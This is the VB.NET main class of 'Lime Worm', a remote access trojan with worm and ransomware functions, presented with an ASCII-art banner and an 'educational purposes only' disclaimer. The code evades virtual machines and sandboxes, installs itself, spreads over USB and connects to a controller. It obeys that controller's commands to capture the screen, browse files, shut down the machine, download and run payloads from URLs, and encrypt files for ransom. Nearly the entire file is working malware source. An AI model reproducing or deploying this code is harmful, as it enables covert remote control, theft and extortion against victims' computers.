
'##################################################################
'##        N Y A N   C A T  |||   Updated on MAR./20/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                     .. Lime Worm v0.4.2 ..                   ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##           https://github.com/NYAN-x-CAT/Lime-Worm            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################


Imports System.IO, System.Threading

Public Class Main
    Public Shared C As New TCP
    Public Shared SPL = "|'L'|"
    Public Shared cap As New CRDP

    Public Shared Sub Main()

        Thread.Sleep(1000)

        Dim createdNew As Boolean
        Settings.NMT = New Mutex(True, Settings.MTX, createdNew)
        Try
            If Not createdNew Then End
        Finally
            If createdNew Then
                Settings.NMT.ReleaseMutex()
            End If
        End Try

        If Settings.ANTI Then
            Call VMware()
            Call Virtualbox()
            Call Sandboxie()
            Call Win_XP()
        End If

        Call Installation.INS()

        If Settings.USB Then
            Dim T1 As Thread = New Threading.Thread(AddressOf USB_SP.StartSP)
            T1.Start()
        End If

        TCP.CON()

        Dim CHK As Thread = New Thread(AddressOf Checking)
        CHK.Start()
    End Sub

    Private Shared Sub Checking()
        Thread.CurrentThread.Sleep(5000)
        Dim Old2 As String = ID.USBSP
        Dim Old As String = ID.Ransomeware
1:
        Try

            While True
                Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
                If Old <> readValue.ToString Then
                    Old = readValue
                    C.Send("!R" & SPL & readValue.ToString)
                End If

                If Settings.USB Then
                    Dim readValue2 = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "USB", Nothing)
                    If Old2 <> readValue2.ToString Then
                        Old2 = readValue2
                        C.Send("!U" & SPL & readValue2.ToString)
                    End If
                End If

                Thread.CurrentThread.Sleep(3000)
            End While
        Catch ex As Exception
            GoTo 1
        End Try
    End Sub


#Region "Socket Events"

    Public Shared Sub Data(ByVal b As Byte())
        Dim A As String() = Split(BS(b), SPL)
        Try
            Select Case A(0)
                Case "PC-RES"
                    Shell("Shutdown –r –f –t 00", AppWinStyle.Hide, False, -1)

                Case "PC-SHUT"
                    Shell("Shutdown –s –f –t 00", AppWinStyle.Hide, False, -1)

                Case "PC-OUT"
                    Shell("Shutdown –l –f –t 00", AppWinStyle.Hide, False, -1)

                Case "ping"
                    C.Send("ping")

                Case "!"
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    C.Send("!" & SPL & s.Width & SPL & s.Height)

                Case "@" ' Start Capture
                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)
                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@" & SPL
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    C.Send(M.ToArray)
                    M.Dispose()

                Case "Close"
                    End

                Case "Reconnect"
                    Application.Restart()
                    End

                Case "Uninstall"
                    Installation.DEL()

                Case "RunDisk"
                    Dim NewFile = Path.GetTempFileName & IO.Path.GetExtension(A(1))
                    File.WriteAllBytes(NewFile, Convert.FromBase64String(A(2)))
                    Thread.CurrentThread.Sleep(1000)
                    Process.Start(NewFile)
                    If A(3).ToString = "update" Then
                        Installation.DEL()
                    End If

                Case "RunURL"
                    Dim NewFile = Path.GetTempFileName & A(2).ToString
                    My.Computer.Network.DownloadFile(A(1), NewFile)
                        Thread.CurrentThread.Sleep(1000)
                        Process.Start(NewFile)
                    If A(3).ToString = "update" Then
                        Installation.DEL()
                    End If

                Case "ENC"
                    Dim ENC As New Encryption
                    ENC.Mynote = A(1)
                    ENC.Mywallpaper = A(2)
                    Thread.CurrentThread.Sleep(1000)
                    ENC.BeforeAttack()

                Case "DEC"

                    Dim DEC As New Decryption
                    DEC.P1 = A(1)
                    Thread.CurrentThread.Sleep(1000)
                    DEC.BeforeDec()

                Case "Details"
                    C.Send("Details" + SPL + ID.Getsystem)

                Case "Drivers"
                    C.Send("FM" & SPL & FMDrives())
                Case "FM"
                    Try
                        C.Send("FM" & SPL & FMFolders(A(1)) & FMFiles(A(1)))
                    Catch
                        C.Send("FM" & SPL & "Error")
                    End Try
                Case "OFM"
                    C.Send("OFM")

            End Select
        Catch ex As Exception
            C.Send("MSG" + SPL + "Error! " + ex.Message)
        End Try

    End Sub
#End Region


End Class

